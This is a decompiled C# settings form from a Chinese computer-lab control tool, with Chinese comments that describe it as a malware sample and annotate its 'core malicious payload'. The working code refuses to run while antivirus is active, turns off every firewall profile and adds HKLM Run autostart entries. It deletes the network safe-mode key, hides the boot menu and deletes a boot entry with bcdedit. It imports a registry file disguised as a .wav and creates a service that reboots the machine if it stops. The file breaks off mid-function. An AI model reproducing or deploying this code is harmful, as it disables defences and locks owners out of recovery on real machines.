using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using set.Internal;

namespace WindowsApplication1
{
	// Token: 0x0200000B RID: 11
	/// <summary>
	/// 「机房管理助手」设置主窗体。界面上 12 项限制（学生端路径、USB、杀毒软件、
	/// 命令提示符、Windows 键、机器编号、高危文件、注册表、小游戏、密码、桌面壁纸、
	/// 浏览器下载）的读取与下发都集中在这个类里，最终落到注册表策略、hosts 文件、
	/// 文件属性、系统服务和引导项上，属于整个样本中恶意行为最集中的文件。
	/// </summary>
	[DesignerGenerated]
	public class Form1 : Form
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00002BE4 File Offset: 0x00000DE4
		/// <summary>
		/// 构造函数。挂上 Load / FormClosing 事件，初始化 hosts 相关路径与主页域名
		/// （这些都是硬编码常量），最后调用设计器生成的 SearchInfo() 建界面。
		/// </summary>
		public Form1()
		{
			base.Load += this.AwakeInfo;
			base.FormClosing += this.ChangeInfo;
			this.hosts文件路径 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
			this.hosts备份路径 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts-bak";
			this.程序释放目录 = "c:\\windows\\jf";
			this.主页域名 = "www.zmyxl2008.com";
			this.hosts硬编码路径 = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			this.hosts已改动 = false;
			this.学生端路径 = "";
			this.SearchInfo();
		}

		// Token: 0x06000033 RID: 51
		/// <summary>
		/// Win32 SystemParametersInfo：本文件只用 20（SPI_SETDESKWALLPAPER）这一种动作，
		/// 配合 ResetInfo 设置桌面壁纸。
		/// </summary>
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern bool SystemParametersInfo(int int_0, int int_1, string string_0, int int_2);

		// Token: 0x06000034 RID: 52
		/// <summary>
		/// Win32 BlockInput：可以冻结键盘鼠标输入。本文件只导入、没有调用。
		/// </summary>
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern object BlockInput(long long_0);

		// Token: 0x06000035 RID: 53
		/// <summary>
		/// Win32 Sleep（和 Thread.Sleep 不同，会阻塞整个进程的主线程）。本文件只导入、没有调用。
		/// </summary>
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern void Sleep(long long_0);

		// Token: 0x06000036 RID: 54
		/// <summary>
		/// Win32 ClipCursor：把鼠标光标限制在给定矩形内。CallInfo 用它锁鼠标。
		/// </summary>
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int ClipCursor(Form1.RECT lpRect);

		// Token: 0x06000037 RID: 55 RVA: 0x00002C84 File Offset: 0x00000E84
		/// <summary>
		/// 窗体加载（Form_Load）。从 HKCU\Software\jfglzs 读回上次保存的 10 项限制开关，
		/// 并把界面上的单选按钮还原到对应状态；学生端路径为空时，依次探测
		/// studentMain / ClassMangerApp / REDAgent 三个电子教室进程并取其 exe 路径。
		/// 原版是 On Error Resume Next：每一项读取各自容错，读失败时该项保持默认分支。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void AwakeInfo(object sender, EventArgs e)
		{
			// 学生端 exe 全路径，优先取用户上次保存的值
			try
			{
				this.学生端路径 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "dzjs", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(this.学生端路径, "", false) != 0)
			{
				this.TextBox1.Text = this.学生端路径;
			}
			else
			{
				// 没保存过就按常见机房教学软件的进程名逐个探测
				try
				{
					this.学生端路径 = this.GetProcessPathsByName("studentMain");
				}
				catch
				{
				}
				if (Operators.CompareString(this.学生端路径, "", false) == 0)
				{
					try
					{
						this.学生端路径 = this.GetProcessPathsByName("ClassMangerApp");
					}
					catch
					{
					}
				}
				if (Operators.CompareString(this.学生端路径, "", false) == 0)
				{
					try
					{
						this.学生端路径 = this.GetProcessPathsByName("REDAgent");
					}
					catch
					{
					}
				}
				if (Operators.CompareString(this.学生端路径, "", false) != 0)
				{
					this.TextBox1.Text = "自动获得文件路径是：" + this.学生端路径;
				}
			}

			// USB 检查：off = 禁止（RadioButton1），否则允许
			try
			{
				this.USB检查开关值 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(this.USB检查开关值, "off", false) == 0)
			{
				this.RadioButton1.Checked = true;
			}
			else
			{
				this.RadioButton2.Checked = true;
			}

			// 杀毒软件检查：off = 禁止（RadioButton3），否则允许
			string 杀毒检查设置 = "";
			try
			{
				杀毒检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(杀毒检查设置, "off", false) == 0)
			{
				this.RadioButton3.Checked = true;
			}
			else
			{
				this.RadioButton4.Checked = true;
			}

			// 命令提示符检查：off = 禁止（RadioButton5），否则允许
			string 命令提示符检查设置 = "";
			try
			{
				命令提示符检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(命令提示符检查设置, "off", false) == 0)
			{
				this.RadioButton5.Checked = true;
			}
			else
			{
				this.RadioButton6.Checked = true;
			}

			// Windows 键检查：on = 禁止（RadioButton11），否则允许
			string Windows键检查设置 = "";
			try
			{
				Windows键检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "win_jian", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(Windows键检查设置, "on", false) == 0)
			{
				this.RadioButton11.Checked = true;
			}
			else
			{
				this.RadioButton12.Checked = true;
			}

			// 小游戏检查：off = 禁止（RadioButton14），否则允许
			string 游戏检查设置 = "";
			try
			{
				游戏检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(游戏检查设置, "off", false) == 0)
			{
				this.RadioButton14.Checked = true;
			}
			else
			{
				this.RadioButton13.Checked = true;
			}

			// 机器编号检查：off = 禁止（RadioButton10），否则允许
			string 机器编号检查设置 = "";
			try
			{
				机器编号检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "bianhao", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(机器编号检查设置, "off", false) == 0)
			{
				this.RadioButton10.Checked = true;
			}
			else
			{
				this.RadioButton9.Checked = true;
			}

			// 浏览器下载检查：on = 禁止（RadioButton7），否则允许
			string 下载检查设置 = "";
			try
			{
				下载检查设置 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "xiazai", ""));
			}
			catch
			{
			}
			if (Operators.CompareString(下载检查设置, "on", false) == 0)
			{
				this.RadioButton7.Checked = true;
			}
			else
			{
				this.RadioButton8.Checked = true;
			}

			// 高危文件（exe/bat/reg）检查：1 = 全允许、2 = 仅允许 C++、0 = 全禁止，默认 2
			int 高危文件设置 = 0;
			try
			{
				高危文件设置 = Conversions.ToInteger(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2));
			}
			catch
			{
			}
			if (高危文件设置 == 1)
			{
				this.RadioButton15.Checked = true;
			}
			else if (高危文件设置 == 2)
			{
				this.RadioButton16.Checked = true;
			}
			else if (高危文件设置 == 0)
			{
				this.RadioButton17.Checked = true;
			}

			// 主程序关闭方式：2 = 自动关闭（RadioButton19）、0 = 完全禁止
			int 关闭方式设置 = 0;
			try
			{
				关闭方式设置 = Conversions.ToInteger(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\jfglzs", "zcb", 2));
			}
			catch
			{
			}
			if (关闭方式设置 == 2)
			{
				this.RadioButton19.Checked = true;
			}
			else if (关闭方式设置 == 0)
			{
				this.RadioButton20.Checked = true;
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00002378 File Offset: 0x00000578
		/// <summary>
		/// 窗体关闭（FormClosing）。不做保存和收尾，直接用 <see cref="M:Microsoft.VisualBasic.CompilerServices.ProjectData.EndApp" />
		/// 掐掉当前进程，使设置程序无法通过正常关窗被收尾（原版行为）。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">关闭事件参数</param>
		private void ChangeInfo(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003230 File Offset: 0x00001430
		/// <summary>
		/// 「手动选择学生端文件」按钮（Button2）。弹出文件对话框，取所选文件名去掉 .exe
		/// 当进程名去查进程：查到才把路径回填到文本框和 <see cref="学生端路径" />，
		/// 查不到就提示重新选择。原版逐条 On Error Resume Next。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void ConcatInfo(object sender, EventArgs e)
		{
			string 所选文件 = "";
			try
			{
				this.OpenFileDialog1.ShowDialog();
			}
			catch
			{
			}
			try
			{
				所选文件 = this.OpenFileDialog1.FileName;
			}
			catch
			{
			}
			string 文件名 = "";
			try
			{
				文件名 = Path.GetFileName(所选文件);
			}
			catch
			{
			}
			// 原版取到了目录名和扩展名但没有使用，这里保留调用以对齐语句顺序
			try
			{
				Path.GetDirectoryName(所选文件);
			}
			catch
			{
			}
			try
			{
				Path.GetExtension(所选文件);
			}
			catch
			{
			}
			bool 进程在运行 = false;
			try
			{
				进程在运行 = this.CheckInfo(Strings.Replace(文件名, ".exe", "", 1, -1, CompareMethod.Binary));
			}
			catch
			{
			}
			if (进程在运行)
			{
				try
				{
					this.TextBox1.Text = this.OpenFileDialog1.FileName;
				}
				catch
				{
				}
				try
				{
					this.学生端路径 = this.OpenFileDialog1.FileName;
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					Interaction.MsgBox("你所选的文件并没有运行，请重新选择或先运行电子教室！", MsgBoxStyle.OkOnly, null);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003370 File Offset: 0x00001570
		/// <summary>
		/// 「保存设置」按钮（Button1）的主流程：安全软件自检 → 360 浏览器提醒 → 网络 /
		/// 学生端路径 / 密码三项校验 → 清场（<see cref="M:WindowsApplication1.Form1.CallInfo" />）→
		/// 下发全部策略（<see cref="M:WindowsApplication1.Form1.DefineInfo" />）→ 备份 hosts →
		/// 拉黑名单 → 重启 explorer → 显示 Form3。
		/// 原版是 On Error Resume Next：按「一个动作」分块容错，块内语句顺序、字符串、数字与原版一致。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void PrepareInfo(object sender, EventArgs e)
		{
			string 桌面目录 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

			// ① 安全软件自检：QQ电脑管家 / 360 杀毒 / 360 卫士 / 360 主动防御跑着就拒绝保存
			bool 有安全软件 = false;
			try
			{
				有安全软件 = this.CheckInfo("QQPCTray") | this.CheckInfo("360sd") | this.CheckInfo("360Tray") | this.CheckInfo("HipsTray");
			}
			catch
			{
			}
			if (有安全软件)
			{
				Interaction.MsgBox("加载一个控件不能成功！检查是否安装了安全卫士、电脑管家、360等杀毒软件，它们会阻止运行（如果必须要安装，只安装火绒杀毒软件，并且现在退出火绒)。技巧：如果你的安装软件列表中并没有杀毒软件，可能是360安全卫士卸载不干净，你可以再次安装360安全卫士然后再卸载它。", MsgBoxStyle.OkOnly, null);
				return;
			}

			// ② 公共桌面上的 exe、桌面上的 lnk 只要出现 360 浏览器，就提醒本软件禁不了它的下载
			try
			{
				IEnumerator<string> 公共桌面exe = CandidateAttr.SetInfo.FileSystem.GetFiles("C:\\Users\\Public\\Desktop", Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.exe" }).GetEnumerator();
				while (公共桌面exe.MoveNext())
				{
					string 文件 = 公共桌面exe.Current;
					if ((Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0))
					{
						Interaction.MsgBox("提醒：卸载360浏览器，本软件不能禁止这个浏览器的下载功能。建议win7只安装Google Chrome浏览器。", MsgBoxStyle.OkOnly, null);
					}
				}
				if (公共桌面exe != null)
				{
					公共桌面exe.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				IEnumerator<string> 桌面快捷方式 = CandidateAttr.SetInfo.FileSystem.GetFiles(桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.lnk" }).GetEnumerator();
				while (桌面快捷方式.MoveNext())
				{
					string 文件 = 桌面快捷方式.Current;
					if ((Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0))
					{
						Interaction.MsgBox("提醒：卸载360浏览器，本软件不能禁止这个浏览器的下载功能。建议win7只安装Google Chrome浏览器。", MsgBoxStyle.OkOnly, null);
					}
				}
				if (桌面快捷方式 != null)
				{
					桌面快捷方式.Dispose();
				}
			}
			catch
			{
			}

			// ③ 百度 443 不通就没法下载黑名单，直接放弃保存
			bool 网络可用 = false;
			try
			{
				网络可用 = this.IsPortOpen("www.baidu.com", 443, 2000);
			}
			catch
			{
			}
			if (!网络可用)
			{
				this.Label2.Text = "网络不通!请先恢复网络，需要下载黑名单等。";
				return;
			}

			// ④ 学生端路径不能为空
			if (Operators.CompareString(this.学生端路径, "", false) == 0)
			{
				this.Label2.Text = "选择学生端程序文件!";
				return;
			}

			// ⑤ 密码长度至少 6 位，且不许用 123456
			if (Strings.Len(this.pd_new.Text) < 6)
			{
				this.Label2.Text = "密码应该是6位或以上的字母或数字，请重新输入！";
				return;
			}
			if (Operators.CompareString(this.pd_new.Text, "123456", false) == 0)
			{
				this.Label2.Text = "密码太简单，请重新输入！";
				return;
			}

			// ⑥ 界面进入忙碌状态：转圈光标、清提示、禁用保存按钮
			this.Cursor = Cursors.WaitCursor;
			this.Label2.Text = "";
			this.Button1.Enabled = false;

			// ⑦ 先清场（杀进程 + 停服务 + 锁鼠标），再下发全部策略
			try
			{
				this.CallInfo();
			}
			catch
			{
			}
			try
			{
				this.DefineInfo();
			}
			catch
			{
			}

			// ⑧ 首次运行时把随程序带的 hosts 模板落到位，并留一份 hosts-bak 备份
			try
			{
				if (!File.Exists(this.hosts文件路径))
				{
					File.Copy("hosts", this.hosts文件路径, true);
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(this.hosts备份路径))
				{
					File.Copy(this.hosts文件路径, this.hosts备份路径, true);
				}
			}
			catch
			{
			}

			// ⑨ 落地本机的域名黑名单
			try
			{
				this.DeleteInfo(Application.StartupPath + "/hmd_local.txt", "on");
			}
			catch
			{
			}

			// ⑩ 作者主页 443 通的话，写主页记录、替换桌面浏览器入口、拉两遍在线黑名单
			bool 主页可用 = false;
			try
			{
				主页可用 = this.IsPortOpen(this.主页域名, 443, 2000);
			}
			catch
			{
			}
			if (主页可用)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "zhuye", this.主页域名, RegistryValueKind.String);
				}
				catch
				{
				}
				try
				{
					this.CollectInfo();
				}
				catch
				{
				}
				try
				{
					this.DeleteInfo("http://" + this.主页域名 + "/hmd_net.txt", "on");
				}
				catch
				{
				}
				try
				{
					Thread.Sleep(200);
				}
				catch
				{
				}
				try
				{
					this.DeleteInfo("http://" + this.主页域名 + "/hmd_net.txt", "on");
				}
				catch
				{
				}
			}

			// ⑪ 停 1 秒，杀掉全部 explorer 再重启，让注册表策略立即生效，最后显示 Form3
			try
			{
				Thread.Sleep(1000);
			}
			catch
			{
			}
			try
			{
				foreach (Process 进程 in Process.GetProcessesByName("explorer"))
				{
					进程.Kill();
				}
			}
			catch
			{
			}
			try
			{
				Process.Start("explorer.exe");
			}
			catch
			{
			}
			this.Cursor = Cursors.Default;
			try
			{
				CandidateAttr.ComputeInfo.Form3.Show();
			}
			catch
			{
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000038C0 File Offset: 0x00001AC0
		/// <summary>
		/// 核心恶意载荷。一次把界面上的 12 项设置全部落到系统：
		/// 写 HKCU\Software\jfglzs 全部开关 → 备份学生端 exe → 放开 cmd / regedit / 运行框 →
		/// sc delete zmserv → regini 提权并导入 yl.reg → 改 usbstor 启动方式 → 写 HKLM Run 开机自启 →
		/// 关防火墙 / 禁锁屏 / 删 SafeBoot\Network → bcdedit 关引导菜单 → 劫持快捷方式 →
		/// 收回 ACL 并写密码摘要 → 重建 zmserv 服务（失败即重启机器）→ 浏览器下载策略 →
		/// 隐藏 hosts、etc、程序目录和所有伴随文件。
		/// 原版整段是 On Error Resume Next：下面按「一项设置 / 一个动作」分块容错，
		/// 块内语句顺序、字符串与数字常量与原版完全一致。
		/// </summary>
		private void DefineInfo()
		{
			// 原版算了一下指针位宽（Marshal.SizeOf(IntPtr.Zero) * 8），后面并没有用到
			int 指针位宽 = checked(Marshal.SizeOf(IntPtr.Zero) * 8);

			RegistryKey 根键 = CandidateAttr.SetInfo.Registry.CurrentUser;
			RegistryKey 子键 = null;
			// 确保 HKCU\Software\jfglzs 存在（原版先 Open，取不到再 Create）
			try
			{
				子键 = 根键.OpenSubKey("Software\\jfglzs");
				if (子键 == null)
				{
					子键 = 根键.CreateSubKey("Software\\jfglzs");
				}
			}
			catch
			{
			}

			// ① 把界面上 12 项选择写进 HKCU\Software\jfglzs，供其它组件（jfglzsn / przs / zmserv）读取
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "dzjs", this.学生端路径, RegistryValueKind.String);
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton1.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton2.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", "on", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton3.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton4.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", "on", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton5.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", "off", RegistryValueKind.String);
				}
				if (this.RadioButton6.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", "on", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton11.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "win_jian", "on", RegistryValueKind.String);
				}
				if (this.RadioButton12.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "win_jian", "off", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton9.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "bianhao", "on", RegistryValueKind.String);
				}
				if (this.RadioButton10.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "bianhao", "off", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton13.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", "on", RegistryValueKind.String);
				}
				if (this.RadioButton14.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "games_jianche", "off", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton7.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "xiazai", "on", RegistryValueKind.String);
				}
				if (this.RadioButton8.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "xiazai", "off", RegistryValueKind.String);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton15.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 1, RegistryValueKind.DWord);
				}
				if (this.RadioButton16.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2, RegistryValueKind.DWord);
				}
				if (this.RadioButton17.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 0, RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
			try
			{
				if (this.RadioButton19.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "zcb", 2, RegistryValueKind.DWord);
				}
				if (this.RadioButton20.Checked)
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\jfglzs", "zcb", 0, RegistryValueKind.DWord);
				}
			}
			catch
			{
			}

			// ② 在学生端 exe 原地再复制一份「<路径>2」，并把同目录的 SpecialSet.exe 藏起来
			string 学生端备份路径 = "";
			try
			{
				学生端备份路径 = this.学生端路径 + "2";
			}
			catch
			{
			}
			try
			{
				File.Copy(this.学生端路径, 学生端备份路径, true);
			}
			catch
			{
			}
			// 学生端 exe 全路径去掉末尾 16 个字符得到学生端安装目录（"\\studentMain.exe" 正好 16 个字符）
			string 学生端程序目录 = "";
			try
			{
				string 学生端exe = this.学生端路径;
				学生端程序目录 = Strings.Mid(学生端exe, 1, checked(Strings.Len(学生端exe) - 16));
			}
			catch
			{
			}
			try
			{
				File.SetAttributes(学生端程序目录 + "\\SpecialSet.exe", File.GetAttributes(学生端程序目录 + "\\SpecialSet.exe") | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}

			// ③ 先把自己需要的入口放开：命令提示符、注册表工具、运行框
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}
			// 删掉旧的服务，后面会用新版 zmserv.exe 重建
			try
			{
				Interaction.Shell("sc delete zmserv", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}

			// ④ 密码摘要（供其它组件校验），然后用 regini 临时放开注册表 ACL 并导入 yl.reg
			string 密码摘要 = "";
			try
			{
				密码摘要 = ObserverAttr.InstantiateInfo(Strings.Trim(this.pd_new.Text));
			}
			catch
			{
			}
			try
			{
				Interaction.Shell(Application.StartupPath + "\\regini.exe " + Application.StartupPath + "\\regqx.ini", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}
			Thread.Sleep(1000);
			try
			{
				File.Copy(Application.StartupPath + "\\yl.wav", Application.StartupPath + "\\yl.reg", true);
			}
			catch
			{
			}
			try
			{
				Interaction.Shell("regedit.exe /s " + Application.StartupPath + "\\yl.reg", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}
			Thread.Sleep(1000);

			// ⑤ USB 存储设备：允许 = Start 3，禁止 = Start 4；CurrentControlSet 与 001/002/003 各写一遍
			if (this.RadioButton1.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 3, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			if (this.RadioButton2.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// ⑥ 开机自启：przs.exe 与 jfglzsn.exe 写进 HKLM\...\RUN；原版连写两遍，中间歇 1 秒
			try
			{
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String);
			}
			catch
			{
			}
			Thread.Sleep(1000);
			try
			{
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String);
			}
			catch
			{
			}

			// ⑦ 三个防火墙配置（标准 / 公用 / 域）全部关掉
			try
			{
				ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\DomainProfile\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ⑧ 禁锁屏 → 删掉「带网络的安全模式」分支 → 关引导菜单并删指定 GUID 的启动项
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableLockWorkstation", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
			try
			{
				根键.DeleteSubKeyTree("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network");
			}
			catch
			{
			}
			try
			{
				Interaction.Shell("cmd /c bcdedit /set {bootmgr} displaybootmenu no", AppWinStyle.MinimizedFocus, false, -1);
			}
			catch
			{
			}
			try
			{
				Interaction.Shell("cmd /c bcdedit /delete {ee888888-8888-8888-8888-8888888888ee}", AppWinStyle.MinimizedFocus, false, -1);
			}
			catch
			{
			}

			// ⑨ 劫持快捷方式 → 收回注册表 ACL → 写密码摘要 → 重建 zmserv 服务
			//    sc failure 的三个失败动作都是 reboot/60000：服务一挂就重启机器
			try
			{
				this.UpdateInfo();
			}
			catch
			{
			}
			try
			{
				Interaction.Shell(Application.StartupPath + "\\regini.exe " + Application.StartupPath + "\\regqxoff.ini", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "n", 密码摘要, RegistryValueKind.String);
			}
			catch
			{
			}
			try
			{
				string 服务路径 = Application.StartupPath + "\\zmserv.exe";
				Interaction.Shell("sc create zmserv binPath= " + 服务路径 + " start= auto", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}
			try
			{
				Interaction.Shell("sc failure zmserv actions= \"reboot/60000/reboot/60000/reboot/60000\" reset= 300 ", AppWinStyle.Hide, true, -1);
			}
			catch
			{
			}
			Thread.Sleep(1000);

			// ⑩ 浏览器策略键先建好（原版逐个 Open，取不到再 Create），后面写策略值才有的放
			根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
			try
			{
				子键 = 根键.OpenSubKey("Software\\Policies\\Google");
				if (子键 == null)
				{
					子键 = 根键.CreateSubKey("Software\\Policies\\Google");
				}
				子键 = 根键.OpenSubKey("Software\\Policies\\Google\\Chrome");
				if (子键 == null)
				{
					子键 = 根键.CreateSubKey("Software\\Policies\\Google\\Chrome");
				}
			}
			catch
			{
			}
